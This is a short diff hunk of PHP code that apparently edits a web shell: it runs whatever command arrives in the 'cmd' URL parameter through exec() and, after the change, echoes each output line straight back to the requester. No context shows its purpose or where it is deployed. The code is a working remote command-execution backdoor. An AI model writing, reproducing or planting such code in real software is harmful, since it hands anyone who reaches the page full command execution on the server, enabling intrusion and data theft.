@@ -14,7 +14,7 @@ if (isset($_GET['cmd'])) {
 	$res = null;
 	exec($_GET['cmd'], $res);
 	foreach ($res as $line) {
-		$content .= $line . "<br>";
+		echo $line . "<br>";
 	}
 }
 
